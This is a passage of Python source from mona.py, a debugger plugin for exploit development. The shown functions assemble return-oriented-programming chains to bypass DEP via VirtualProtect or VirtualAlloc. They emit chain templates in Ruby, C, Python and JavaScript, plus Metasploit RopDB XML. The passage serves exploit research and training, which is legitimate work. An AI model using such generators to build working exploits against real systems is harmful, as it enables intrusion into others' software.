							thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
						else:
							vplogtxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
							thischaintxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
						ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),thisinstr.strip(" "))
						tohex_array.append(gadgetstep)
						
						if showfills:
							vplogtxt += createJunk(returnoffset,"Filler (retn offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (retn offset compensation)",fillersize)
							if returnoffset > 0:
								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							returnoffset = getOffset(interestinggadgets[gadgetstep])
							if delayedfill > 0:
								vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
								delayedfill = 0
							if thisinstr.startswith("POP "):
								delayedfill = junksize
							else:
								vplogtxt += createJunk(junksize,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(junksize,"Filler (compensate)",fillersize)
								if junksize > 0:
									ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
					else:
						# still could be a pointer
						thismodname = MnPointer(gadgetstep).belongsTo()
						if thismodname != "":
							tmod = MnModule(thismodname)
							if not thismodname in modused:
								modused[thismodname] = [tmod.moduleBase,tmod.__str__()]
							modprefix = "base_" + sanitize_module_name(thismodname)
							if showrva:
								alignsize = longestmod - len(sanitize_module_name(thismodname))
								vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
								thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
							else:
								vplogtxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)		
								thischaintxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)
							ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),steptxt.strip(" "))
						else:						
							vplogtxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)
							thischaintxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)						
							ropdbchain += '    <gadget value="0x%s">%s</gadget>\n' % (toHex(gadgetstep),steptxt.strip(" "))
						
						if steptxt.startswith("[-]"):
							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							returnoffset = 0
						if delayedfill > 0:
							vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
							delayedfill = 0							
						vplogtxt += createJunk(junksize,"",fillersize)
						thischaintxt += createJunk(junksize,"",fillersize)
						if fillersize > 0:
							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
		# finish it off
		steptxt = ""
		vplogtxt += 	"      #[---INFO:pushad:---]\n"  
		thischaintxt += "      #[---INFO:pushad:---]\n"
		if "pushad" in suggestions:
			shortest_pushad = getShortestGadget(suggestions["pushad"])
			junksize = getJunk(interestinggadgets[shortest_pushad])
			thisinstr = interestinggadgets[shortest_pushad].lstrip()
			if thisinstr.startswith("#"):
				thisinstr = thisinstr[2:len(thisinstr)]
			regimpact = getRegImpact(thisinstr)
			thismodname = MnPointer(shortest_pushad).belongsTo()
			thisinstr += " [" + thismodname + "]"
			tmod = MnModule(thismodname)
			thisinstr += getGadgetAddressInfo(shortest_pushad)
			if not thismodname in modused:
				modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
			modprefix = "base_" + sanitize_module_name(thismodname)
			if showrva:
				alignsize = longestmod - len(thismodname)
				vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
				thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
			else:
				vplogtxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
				thischaintxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
			ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(shortest_pushad-tmod.moduleBase),thisinstr.strip(" "))
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			if fillersize > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
			vplogtxt += createJunk(junksize,"",fillersize)
			thischaintxt += createJunk(junksize,"",fillersize)
			if fillersize > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
			
		else:
			vplogtxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			thischaintxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			ropdbchain += '    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>\n'
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			if returnoffset > 0:
				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'	
		
		# anything else to add ?
		if len(toadd) > 0:
			vplogtxt += 	"      #[---INFO:extras:---]\n"  
			thischaintxt += "      #[---INFO:extras:---]\n"
			for adds in toadd:
				theptr = toadd[adds][0]
				freetext = toadd[adds][1]
				if theptr > 0:
					thismodname = MnPointer(theptr).belongsTo()
					freetext += " [" + thismodname + "]"
					tmod = MnModule(thismodname)
					freetext += getGadgetAddressInfo(theptr)
					if not thismodname in modused:
						modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
					modprefix = "base_" + sanitize_module_name(thismodname)
					if showrva:
						alignsize = longestmod - len(thismodname)
						vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
						thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
					else:
						vplogtxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
						thischaintxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
					ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(theptr-tmod.moduleBase),freetext.strip(" "))
				else:
					vplogtxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
					thischaintxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
					ropdbchain += '    <gadget offset="0x%s">Unable to find %s</gadget>\n' % (toHex(theptr),freetext.strip(" "))
		
		vplogtxt += '    ].flatten.pack("V*")\n'
		vplogtxt += '\n    return rop_gadgets\n\n'
		vplogtxt += '  end\n'
		vplogtxt += '\n\n  # Call the ROP chain generator inside the \'exploit\' function :\n\n'
		calltxt = "rop_chain = create_rop_chain("
		argtxt = ""
		vplogtxtpy = ""
		vplogtxtc = ""
		vplogtxtjs = ""
		argtxtpy = ""
		if showrva:
			for themod in modused:
				repr_mod = sanitize_module_name(themod)
				vplogtxt += "  # " + modused[themod][1] + "\n"
				vplogtxtpy += "  # " + modused[themod][1] + "\n"
				vplogtxtc += "  // " + modused[themod][1] + "\n"
				vplogtxtjs += "  // " + modused[themod][1] + "\n"
				vplogtxt += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
				vplogtxtjs += "  var base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
				vplogtxtpy += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
				vplogtxtc += "  unsigned int base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
				calltxt += "base_" + repr_mod + ","
				argtxt += "base_" + repr_mod + ","
				argtxtpy += "base_" + repr_mod + ","				
		calltxt = calltxt.rstrip(",") + ")\n"
		argtxt = argtxt.strip(",")
		argtxtpy = argtxtpy.strip(",")
		argtxtjs = argtxtpy.replace(".","")
		
		vplogtxt = vplogtxt.replace("create_rop_chain()","create_rop_chain(" + argtxt + ")")
		vplogtxt += '\n  ' + calltxt
		vplogtxt += '\n\n\n'
		# C
		vplogtxt += "*** [ C ] ***\n\n"
		vplogtxt += "  #define CREATE_ROP_CHAIN(name, ...) \\\n"
		vplogtxt += "    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \\\n"
		vplogtxt += "    unsigned int name[name##_length / sizeof(unsigned int)]; \\\n"
		vplogtxt += "    create_rop_chain(name, ##__VA_ARGS__);\n\n"
		vplogtxt += "  int create_rop_chain(unsigned int *buf, %s)\n" % ", ".join("unsigned int %s" % _ for _ in argtxt.split(","))
		vplogtxt += "  {\n"
		vplogtxt += "    // rop chain generated with mona.py - www.corelan.be\n"			
		vplogtxt += "    unsigned int rop_gadgets[] = {\n"
		vplogtxt += thischaintxt.replace("#", "//")
		vplogtxt += "    };\n"
		vplogtxt += "    if(buf != NULL) {\n"
		vplogtxt += "      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));\n"
		vplogtxt += "    };\n"
		vplogtxt += "    return sizeof(rop_gadgets);\n"
		vplogtxt += "  }\n\n"
		vplogtxt += vplogtxtc
		vplogtxt += "  // use the 'rop_chain' variable after this call, it's just an unsigned int[]\n"
		vplogtxt += "  CREATE_ROP_CHAIN(rop_chain, %s);\n" % argtxtpy
		vplogtxt += "  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:\n"
		vplogtxt += "  // unsigned int rop_chain[256];\n"
		vplogtxt += "  // int rop_chain_length = create_rop_chain(rop_chain, %s);\n\n" % argtxtpy
		# Python
		vplogtxt += "*** [ Python ] ***\n\n"		
		vplogtxt += "  def create_rop_chain(%s):\n" % argtxt
		vplogtxt += "\n    # rop chain generated with mona.py - www.corelan.be\n"			
		vplogtxt += "    rop_gadgets = [\n"
		vplogtxt += thischaintxt
		vplogtxt += "    ]\n"
		vplogtxt += "    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)\n\n"
		vplogtxt += vplogtxtpy
		vplogtxt += "  rop_chain = create_rop_chain(%s)\n\n" % argtxtpy
		# Javascript
		vplogtxt += "\n\n*** [ JavaScript ] ***\n\n"
		vplogtxt += "  //rop chain generated with mona.py - www.corelan.be\n"		
		if not showrva:
			vplogtxt += "  rop_gadgets = unescape(\n"
			allptr = thischaintxt.split("\n")
			tptrcnt = 0
			for tptr in allptr:
				comments = tptr.split(",")
				comment = ""
				if len(comments) > 1:
					# add everything
					ic = 1
					while ic < len(comments):
						comment += "," + comments[ic]
						ic += 1
				tptrcnt += 1
				comment = comment.replace("  ","")
				if tptrcnt < len(allptr):
					vplogtxt += "    \"" + toJavaScript(tptr) + "\" + // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n"
				else:
					vplogtxt += "    \"" + toJavaScript(tptr) + "\"); // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n\n"
		else:
			vplogtxt += "  function get_rop_chain(%s) {\n" % argtxtjs
			vplogtxt += "    var rop_gadgets = [\n"
			vplogtxt += thischaintxt.replace("  #","  //").replace(".","")
			vplogtxt += "      ];\n"
			vplogtxt += "    return rop_gadgets;\n"
			vplogtxt += "  }\n\n"
			vplogtxt += "  function gadgets2uni(gadgets) {\n"
			vplogtxt += "    var uni = \"\";\n"
			vplogtxt += "    for(var i=0;i<gadgets.length;i++){\n"
			vplogtxt += "      uni += d2u(gadgets[i]);\n"
			vplogtxt += "    }\n"
			vplogtxt += "    return uni;\n"
			vplogtxt += "  }\n\n"
			vplogtxt += "  function d2u(dword) {\n"
			vplogtxt += "    var uni = String.fromCharCode(dword & 0xFFFF);\n"
			vplogtxt += "    uni += String.fromCharCode(dword>>16);\n"
			vplogtxt += "    return uni;\n"
			vplogtxt += "  }\n\n"
			vplogtxt += "%s" % vplogtxtjs
			vplogtxt += "\n  var rop_chain = gadgets2uni(get_rop_chain(%s));\n\n" % argtxtjs
		vplogtxt += '\n--------------------------------------------------------------------------------------------------\n\n'
		
		# MSF RopDB XML Format - spit out if only one module was selected
		if len(modused) == 1:
			modulename = ""
			for modname in modused:
				modulename = modname
			objMod = MnModule(modulename)
			modversion = objMod.moduleVersion
			modbase = objMod.moduleBase
			ropdb = '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
			ropdb += "<db>\n<rop>\n"
			ropdb += "  <compatibility>\n"
			ropdb += "    <target>%s</target>\n" % modversion
			ropdb += "  </compatibility>\n\n"
			ropdb += '  <gadgets base="0x%s">\n' % toHex(modbase)
			ropdb += ropdbchain.replace('[' + modulename + ']','').replace('&','').replace('[IAT ' + modulename + ']','')
			ropdb += '  </gadgets>\n'
			ropdb += '</rop>\n</db>'
			# write to file if needed
			shortmodname = modulename.replace(".dll","")
			if ropdbchain.lower().find("virtualprotect") > -1:
				ofile = MnLog(shortmodname+"_virtualprotect.xml")
				thisofile = ofile.reset(showheader = False, skipModuleTable=True)
				ofile.write(ropdb,thisofile)
			if ropdbchain.lower().find("virtualalloc") > -1:
				ofile = MnLog(shortmodname+"_virtualalloc.xml")
				thisofile = ofile.reset(showheader = False, skipModuleTable=True)
				ofile.write(ropdb,thisofile)
		
		#go to the next one
		
	vpfile = MnLog("rop_chains.txt")
	thisvplog = vpfile.reset()
	vpfile.write(vplogtxt,thisvplog)
	
	dbg.log("[+] ROP chains written to file %s" % thisvplog)
	objprogressfile.write("Done creating rop chains",progressfile)
	return vplogtxt


def getGadgetAddressInfo(gadgetptr):
	gadgetmodname = MnPointer(gadgetptr).belongsTo()
	infotxt = ""
	tmod = MnModule(gadgetmodname)
	if (tmod.isRebase):
		infotxt += " ** REBASED"
	if (tmod.isAslr):
		infotxt += " ** ASLR"	
	return infotxt


def getRegImpact(instructionstr):
	rimpact = {}
	instrlineparts = instructionstr.split(" # ")
	changers = ["add","sub","adc","inc","dec","xor"]
	for i in instrlineparts:
		instrparts = i.split(" ")
		dreg = ""
		dval = 0
		if len(instrparts) > 1:
			if instrparts[0] in changers:
				dreg = instrparts[1]
				if instrparts[0] == "inc":
					dval = -1
				elif instrparts[0] == "dec":
					dval = 1
				else:
					vparts = i.split(",")
					if len(vparts) > 1:
						vpart = vparts[1]
						dval = vpart

		if dreg != "":
			if not dreg in rimpact:
				rimpact[dreg] = dval
			else:
				rimpact[dreg] = rimpact[dreg] + dval

	return rimpact


def getPickupGadget(targetreg,targetval,freetext,suggestions,interestinggadgets,criteria,modulecriteria,routine=""):
	"""
	Will attempt to find a gadget that will pickup a pointer to pointer into a register
	
	Arguments : the destination register, the value to pick up, some free text about the value,
	suggestions and interestinggadgets dictionaries
	
	Returns :
	an array with the gadgets
	"""
	
	shortest_pickup = 0
	thisshortest_pickup = 0
	shortest_move = 0
	popptr = 0
	
	pickupfrom = ""
	pickupreg = ""
	pickupfound = False
	
	pickupchain = []
	movechain = []
	movechain1 = []
	movechain2 = []
	
	disablelist = []
	
	allregs = ["eax","ebx","ecx","edx","ebp","esi","edi"]
	
	for pickuptypes in suggestions:
		if pickuptypes.find("pickup pointer into " + targetreg) > -1: 
			thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
			if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
				shortest_pickup = thisshortest_pickup
				smallparts = pickuptypes.split(" ")
				pickupreg = smallparts[len(smallparts)-1].lower()
				parts2 = interestinggadgets[shortest_pickup].split("#")
				 #parts2[0] is empty
				smallparts = parts2[1].split("[")
				smallparts2 = smallparts[1].split("]")
				pickupfrom = smallparts2[0].lower()
				pickupfound = True
				if (pickupfrom.find("+") > -1):
					pickupfields = pickupfrom.split("+")
					if pickupfields[1].lower in allregs:
						pickupfound = False
						shortest_pickup = 0
				if (pickupfrom.find("-") > -1):
					pickupfields = pickupfrom.split("-")
					if pickupfields[1].lower in allregs:
						pickupfound = False
						shortest_pickup = 0				

	if shortest_pickup == 0:
		# no direct pickup, look for indirect pickup, but prefer EAX first
		for movetypes in suggestions:
			if movetypes.find("move eax") == 0 and movetypes.endswith("-> " + targetreg):
				typeparts = movetypes.split(" ")
				movefrom = "eax"
				shortest_move = getShortestGadget(suggestions[movetypes])
				movechain = getGadgetMoveRegToReg(movefrom,targetreg,suggestions,interestinggadgets)
				for pickuptypes in suggestions:
					if pickuptypes.find("pickup pointer into " + movefrom) > -1:
						thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
						if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
							shortest_pickup = thisshortest_pickup
							smallparts = pickuptypes.split(" ")
							pickupreg = smallparts[len(smallparts)-1].lower()
							parts2 = interestinggadgets[shortest_pickup].split("#")
							 #parts2[0] is empty
							smallparts = parts2[1].split("[")
							smallparts2 = smallparts[1].split("]")
							pickupfrom = smallparts2[0].lower()
							pickupfound = True
							if (pickupfrom.find("+") > -1):
								pickupfields = pickupfrom.split("+")
								if pickupfields[1].lower in allregs:
									pickupfound = False
									shortest_pickup = 0
							if (pickupfrom.find("-") > -1):
								pickupfields = pickupfrom.split("-")
								if pickupfields[1].lower in allregs:
									pickupfound = False
									shortest_pickup = 0
				if pickupfound:
					break
				
	if shortest_pickup == 0:
		# no direct pickup, look for indirect pickup
		for movetypes in suggestions:
			if movetypes.find("move") == 0 and movetypes.endswith("-> " + targetreg):
				typeparts = movetypes.split(" ")
				movefrom = typeparts[1]
				if movefrom != "esp":
					shortest_move = getShortestGadget(suggestions[movetypes])
					movechain = getGadgetMoveRegToReg(movefrom,targetreg,suggestions,interestinggadgets)
					for pickuptypes in suggestions:
						if pickuptypes.find("pickup pointer into " + movefrom) > -1:
							thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
							if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
								shortest_pickup = thisshortest_pickup
								smallparts = pickuptypes.split(" ")
								pickupreg = smallparts[len(smallparts)-1].lower()
								parts2 = interestinggadgets[shortest_pickup].split("#")
								 #parts2[0] is empty
								smallparts = parts2[1].split("[")
								smallparts2 = smallparts[1].split("]")
								pickupfrom = smallparts2[0].lower()
								pickupfound = True
								if (pickupfrom.find("+") > -1):
									pickupfields = pickupfrom.split("+")
									if pickupfields[1].lower in allregs:
										pickupfound = False
										shortest_pickup = 0
								if (pickupfrom.find("-") > -1):
									pickupfields = pickupfrom.split("-")
									if pickupfields[1].lower in allregs:
										pickupfound = False
										shortest_pickup = 0
					if pickupfound:
						break
						
	if shortest_pickup == 0:
		movechain = []
		#double move
		for movetype1 in suggestions:
			if movetype1.find("move") == 0 and movetype1.endswith("-> " + targetreg):
				interimreg = movetype1.split(" ")[1]
				if interimreg != "esp":
					for movetype2 in suggestions:
						if movetype2.find("move") == 0 and movetype2.endswith("-> " + interimreg):
							topickupreg= movetype2.split(" ")[1]
							if topickupreg != "esp":
								move1 = getShortestGadget(suggestions[movetype1])
								move2 = getShortestGadget(suggestions[movetype2])								
								for pickuptypes in suggestions:
									if pickuptypes.find("pickup pointer into " + topickupreg) > -1:
										thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
										if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
											shortest_pickup = thisshortest_pickup
											smallparts = pickuptypes.split(" ")
											pickupreg = smallparts[len(smallparts)-1].lower()
											parts2 = interestinggadgets[shortest_pickup].split("#")
											 #parts2[0] is empty
											smallparts = parts2[1].split("[")
											smallparts2 = smallparts[1].split("]")
											pickupfrom = smallparts2[0].lower()
											pickupfound = True
											if (pickupfrom.find("+") > -1):
												pickupfields = pickupfrom.split("+")
												if pickupfields[1].lower in allregs:
													pickupfound = False
													shortest_pickup = 0
											if (pickupfrom.find("-") > -1):
												pickupfields = pickupfrom.split("-")
												if pickupfields[1].lower in allregs:
													pickupfound = False
													shortest_pickup = 0		
								if pickupfound:
									movechain = []
									movechain1 = getGadgetMoveRegToReg(interimreg,targetreg,suggestions,interestinggadgets)
									movechain2 = getGadgetMoveRegToReg(topickupreg,interimreg,suggestions,interestinggadgets)
									break
									
	if shortest_pickup > 0:
		# put a value in a register
		if targetval > 0:
			poproutine = putValueInReg(pickupfrom,targetval,freetext,suggestions,interestinggadgets,criteria)
			for popsteps in poproutine:
				pickupchain.append([popsteps[0],popsteps[1],popsteps[2]])
		else:
			pickupchain.append([0,"[-] Unable to find API pointer -> " + pickupfrom,0])
		# pickup
		junksize = getJunk(interestinggadgets[shortest_pickup])
		pickupchain.append([shortest_pickup,"",junksize])
		# move if needed
		if len(movechain) > 0:
			for movesteps in movechain:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain2) > 0:
			for movesteps in movechain2:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain1) > 0:
			for movesteps in movechain1:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
	elif (routine.lower() == "virtualalloc" or routine.lower() == "virtualprotect"):
		# use alternative technique, in case of virtualprotect/virtualalloc routine
		if "pop " + targetreg in suggestions and "pop eax" in suggestions:
			# find a jmp [eax]
			pattern = "jmp [eax]"
			base = 0
			top = TOP_USERLAND
			type = "instr"
			al = criteria["accesslevel"]
			criteria["accesslevel"] = "X"
			global ptr_to_get
			global ptr_counter
			ptr_counter = 0				
			ptr_to_get = 5
			theptr = 0
			global silent
			oldsilent = silent
			silent=True				
			allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
			silent = oldsilent
			criteria["accesslevel"] = al
			thismodname = ""
			if len(allpointers) > 0:
				for ptrtype in allpointers:
					for ptrs in allpointers[ptrtype]:
						theptr = ptrs
						thismodname = MnPointer(theptr).belongsTo()
						break
			if theptr > 0:
				popptrtar = getShortestGadget(suggestions["pop "+targetreg])
				popptreax = getShortestGadget(suggestions["pop eax"])
				junksize = getJunk(interestinggadgets[popptrtar])-4
				pickupchain.append([popptrtar,"",junksize])
				pickupchain.append([theptr,"jmp [eax] [" + thismodname + "]",0])
				junksize = getJunk(interestinggadgets[popptreax])-4
				pickupchain.append([popptreax,"",junksize])
				pickupchain.append([targetval,freetext,0])
				disablelist.append("eax")
				pickupfound = True	

	if not pickupfound:
		pickupchain.append([0,"[-] Unable to find gadgets to pickup the desired API pointer into " + targetreg,0])
		pickupchain.append([targetval,freetext,0])
		
	return pickupchain,disablelist
	
def getRopFuncPtr(apiname,modulecriteria,criteria,mode, objprogressfile, progressfile):
	"""
	Will get a pointer to pointer to the given API name in the IAT of the selected modules
	
	Arguments :
	apiname : the name of the function
	modulecriteria & criteria : module/pointer criteria
	
	Returns :
	a pointer (integer value, 0 if no pointer was found)
	text (with optional info)
	"""
	dbg.log("")
	dbg.log("[+] Querying IATs for %s" % apiname)

	dbgp(get_current_function_name())

	global silent
	oldsilent = silent
	silent = True
	global ptr_to_get
	ptr_to_get = -1	
	rfuncsearch = apiname.lower()
    
	selectedmodules = False
	if "modules" in modulecriteria:
		if len(modulecriteria["modules"]) > 0:
			selectedmodules = True

	arrfuncsearch = [rfuncsearch]
	if rfuncsearch == "virtualloc":
		arrfuncsearch.append("virtuallocstub")
	
	ropfuncptr = 0
	ropfuncoffsets = {}
	ropfunctext = "ptr to &" + apiname + "()"
	objprogressfile.write("  * Ropfunc - Looking for %s (IAT) - modulecriteria: %s" % (ropfunctext, modulecriteria), progressfile)
	if mode == "iat":
		if rfuncsearch != "":
			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria, [rfuncsearch])
		else:
			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria)
		silent = oldsilent
		#first look for good one
		objprogressfile.write("  * Ropfunc - Found %d pointers" % len(ropfuncs), progressfile)
		for ropfunctypes in ropfuncs:
			dbg.log("Ropfunc - %s %s" % (ropfunctypes, rfuncsearch))
			if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
				ropfuncptr = ropfuncs[ropfunctypes][0]
				break
                
		if ropfuncptr == 0:
			for ropfunctypes in ropfuncs:
				if ropfunctypes.lower().find(rfuncsearch) > -1:
					ropfuncptr = ropfuncs[ropfunctypes][0]
					break
		#dbg.log("Ropfunc - Selected pointer: 0x%08x" % ropfuncptr)
        
		#haven't found pointer, and you were looking at specific modules only? remove module restriction, but still exclude ASLR/rebase
		if (ropfuncptr == 0) and selectedmodules:
			objprogressfile.write("  * Ropfunc - No results yet, expanding search to all non ASLR/rebase modules", progressfile)
			oldsilent = silent
			silent = True
			limitedmodulecriteria = {}
			limitedmodulecriteria["aslr"] = False
			limitedmodulecriteria["rebase"] = False
			limitedmodulecriteria["os"] = False
			ropfuncs,ropfuncoffsets = findROPFUNC(limitedmodulecriteria,criteria)
			silent = oldsilent
			for ropfunctypes in ropfuncs:
				#dbg.log("Ropfunc - %s %s" % (ropfunctypes, rfuncsearch))
				if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
					ropfuncptr = ropfuncs[ropfunctypes][0]
					break
                
		#still haven't found ? clear out modulecriteria, include ASLR/rebase modules (but not OS modules)
		#if (ropfuncptr == 0) and not selectedmodules:
		#	objprogressfile.write("  * Ropfunc - Still no results, now going to search in all application modules", progressfile)
		#	oldsilent = silent
		#	silent = True
		#	limitedmodulecriteria = {}
		#	# search in anything except known OS modules - bad idea anyway
		#	limitedmodulecriteria["os"] = False
		#	ropfuncs2,ropfuncoffsets2 = findROPFUNC(limitedmodulecriteria,criteria)
		#	silent = oldsilent
		#	for ropfunctypes in ropfuncs2:
		#		if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
		#			ropfuncptr = ropfuncs2[ropfunctypes][0]
		#			ropfunctext += " (skipped module criteria, check if pointer is reliable !)"
		#			break	
		
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find ptr to &" + apiname+"()"
		else:
			ropfptrmodname = MnPointer(ropfuncptr).belongsTo()
			tmod = MnModule(ropfptrmodname)					
			ropfptrmodinfo = getGadgetAddressInfo(ropfuncptr)
			ropfunctext += " [IAT " + ropfptrmodname  + "]" + ropfptrmodinfo
	else:
		# read EAT
		modulestosearch = getModulesToQuery(modulecriteria)
		for mod in modulestosearch:
			tmod = MnModule(mod)
			funcs = tmod.getEAT()
			for func in funcs:
				funcname = funcs[func].lower()
				if funcname.find(rfuncsearch) > -1:
					ropfuncptr = func
					break
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find required API pointer"
	return ropfuncptr,ropfunctext

	
def putValueInReg(reg,value,freetext,suggestions,interestinggadgets,criteria):

	putchain = []
	allownull = True
	popptr = 0
	gadgetfound = False
	
	offset = 0
	if "+" in reg:
		try:
			rval = reg.split("+")[1].strip("h")
			offset = int(rval,16) * (-1)
			reg = reg.split("+")[0]
		except:
			reg = reg.split("+")[0]
			offset = 0
	elif "-" in reg:
		try:
			rval = reg.split("-")[1].strip("h")
			offset = int(rval,16)
			reg = reg.split("-")[0]
		except:
			reg = reg.split("-")[0]
			offset = 0
			
	if value != 0:	
		value = value + offset

	if value < 0:
		value = 0xffffffff + value + 1
		
	negvalue = 4294967296 - value
	
	ptrval = MnPointer(value)	
	
	if meetsCriteria(ptrval,criteria):
		# easy way - just pop it into a register
		for poptype in suggestions:
			if poptype.find("pop "+reg) == 0:
				popptr = getShortestGadget(suggestions[poptype])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([value,freetext,0])
				gadgetfound = True
				break
		if not gadgetfound:
			# move
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					# get "from" reg
					fromreg = movetype.split(" ")[1].lower()
					for poptype in suggestions:
						if poptype.find("pop "+fromreg) == 0:
							popptr = getShortestGadget(suggestions[poptype])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([value,freetext,0])
							moveptr = getShortestGadget(suggestions[movetype])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
					if gadgetfound:
						break
	if not gadgetfound or not meetsCriteria(ptrval,criteria):
		if meetsCriteria(MnPointer(negvalue),criteria):
			if "pop " + reg in suggestions and "neg "+reg in suggestions:
				popptr = getShortestGadget(suggestions["pop "+reg])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value),0])
				negptr = getShortestGadget(suggestions["neg "+reg])
				junksize = getJunk(interestinggadgets[negptr])
				putchain.append([negptr,"",junksize])
				gadgetfound = True
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions:
							popptr = getShortestGadget(suggestions["pop "+fromreg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value)])
							negptr = getShortestGadget(suggestions["neg "+fromreg])
